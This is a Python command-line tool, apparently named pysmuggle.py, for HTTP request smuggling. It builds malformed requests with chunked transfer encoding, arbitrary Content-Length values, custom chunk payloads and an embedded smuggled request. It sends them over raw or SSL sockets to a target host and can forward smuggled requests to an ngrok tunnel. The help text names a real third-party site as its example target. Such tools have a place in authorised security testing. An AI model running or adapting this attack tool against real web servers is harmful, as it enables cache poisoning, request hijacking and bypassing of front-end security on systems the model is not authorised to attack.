#!/usr/bin/env python3

import sys
import argparse
from webrequest import WebRequest,ColorPallete,RN,PREFIX,user_agents,options
import socket
import ssl
import requests

if __name__ == '__main__':
    cp = ColorPallete()
    request_headers = {}
    parser = argparse.ArgumentParser(description="Send (malformed) http requests to a host.\n\nExample: python3 pysmuggle.py --host stallman.org --request-headers \"Transfer-Encoding:chunked,Content-Type:text/html\" --smuggled-body-fields \"\" --body-data \"\" --port 443 --debug 1")
    parser.add_argument('--host', type=str, nargs='?',help='target host')
    parser.add_argument('--port', type=int, nargs='?',help='target port on host')
    parser.add_argument('--ngrok', type=str, nargs='?',help='ngrok url for forward/redirected/smuggled requests')
    parser.add_argument('--method', type=str, nargs='?',help='method to use for request header')
    parser.add_argument('--endpoint', type=str, nargs='?',help='endpoint on host server to direct request to')
    parser.add_argument('--http-version', type=str, nargs='?',help='http version to use for request')
    parser.add_argument('--request-headers',type=str,nargs='?',help='request header fields (as a , seperated list of the form k1:v1,k2:v2,...) for conversion to a dict')
    parser.add_argument('--debug', type=str, nargs='?', help='toggle verbosity level')
    parser.add_argument('--special-formatting', type=str,nargs='?',help='use special formatting of header fields')
    parser.add_argument('--body-data', type=str, nargs='?',help='request body data, enclosed within \"\" if contains whitespaces')
    parser.add_argument('--body-length', type=str, nargs='?',help='set the content-length of the request body to arbitrary size')
    parser.add_argument('--smuggled-body-fields',type=str,nargs='?', help='headers, enclosed within \"\" for a smuggled request witin the body of the main http request')
    parser.add_argument('--use-ssl', type=str, nargs='?', help='option to configure socket to communicate over SSL with the remote host')
    parser.add_argument('--custom-body-payload',type=str,nargs='?',help='option to set the request body explicitly using a string enclosed in \"\". example: --custom-body-payload \"length=5;body=5e\\r\\nPOST / HTTP/1.1\\r\\n\\r\\n\" or --custom-body-payload \"5;5e\\r\\nPOST / HTTP/1.1\\r\\n\"')
    parser.add_argument('--prefix',type=str,nargs='?',help='prefix to prepend to request body data')
    args = parser.parse_args()
    args_map = args._get_kwargs()
    for i in range(len(args_map)):
        e = args_map[i]
        k,v = e
        if k == 'host' and v == None:
            cp.log(color='red',msg='[error] no host specified')
            exit(-1)
        if k == 'debug' and v == None:
            args.debug = True
        elif k == 'debug' and v != None:
            args.debug = False if v in ['False','false','0','off','none','no'] else v in ['True','true','1','yes','on','all'] 
        if k == 'endpoint' and v == None:
            args.endpoint = '/'
        if k == 'method' and v == None:
            args.method = 'GET'
        if k == 'http_version' and v == None:
            args.http_version = '1.1'
        if k == 'special_formatting' and v == None:
            args.special_formatting = False
        if k == 'ngrok' and v == None:
            args.ngrok = ''
        if k == 'port' and v == None:
            args.port = 443
        if k == 'request_headers' and v == None:
            args.request_headers = options
        elif k == 'request_headers' and v != None:
            fields = v.split(',')
            for e in fields:
                attr,val = e.split(':')
                request_headers[attr] = val
            args.request_headers = request_headers
        if k == 'body_data' and v == None:
            args.body_data = ''
        if k == 'body_length' and v == None:
            args.body_length = str(len(args.body_data))
            use_body_len = True
        elif k == 'body_length' and v != None:
            args.body_length = v
            use_body_len = False
        if k == 'smuggled_body_fields' and v == None:
            args.smuggled_body_fields = ['POST /404 HTTP/1.1','X-Ignore: X']
        elif k == 'smuggled_body_fields' and v != None:
            args.smuggled_body_fields = v.split(',')
        if k == 'custom_body_payload' and v == None:
            use_custom_body = False
        elif k == 'custom_body_payload' and v != None:
            use_custom_body = True
            fields = v.split(';')
            for e in fields:
                if 'length=' in e:
                    custom_body_length = int(e[e.find('=')+1:])
                elif e.isnumeric():
                    custom_body_length = int(e)
                if 'body=' in e:
                    custom_body = e[e.find('=')+1:]
                elif 'body=' not in e and len(fields) > 1:
                    custom_body = fields[1]
        if k == 'prefix' and v == None:
            args.prefix = PREFIX
        elif k == 'prefix' and v != None:
            args.prefix = v
        if k == 'use_ssl' and v == None:
            args.use_ssl = True
        elif k == 'use_ssl' and v != None:
            args.use_ssl = False if v in ['False','false','no','off','0'] else v in ['True','true','yes','1','on']
    if args.debug:
        cp.log(color='yellow',msg='Got arguments: ')
        for k,v in args._get_kwargs():
            cp.set_color(color='yellow')
            print('\t{}:'.format(k),end='')
            cp.set_color(color='purple')
            print('{} '.format(v))
            cp.set_color(color='reset')
    try:
        wr = WebRequest(host=args.host,
                        port=args.port,
                        ngrok=args.ngrok,
                        method=args.method,
                        endpoint=args.endpoint,
                        http_version=args.http_version,
                        options=args.request_headers,
                        prefix=args.prefix,
                        debug=args.debug,
                        special_formatting=args.special_formatting)
        if use_custom_body:
            wr.make_custom_body(length=custom_body_length, data=custom_body)
        else:
            wr.make_body(data=(args.prefix+args.body_data),options=args.smuggled_body_fields,use_body_len=use_body_len,length=args.body_length)
        msg = wr.make_request_msg()
        wr.connect(use_ssl=args.use_ssl)
        wr.send(msg)
        wr.recv()
    except Exception as e:
        print('Exception: {}'.format(e))
    finally:
        wr.close()
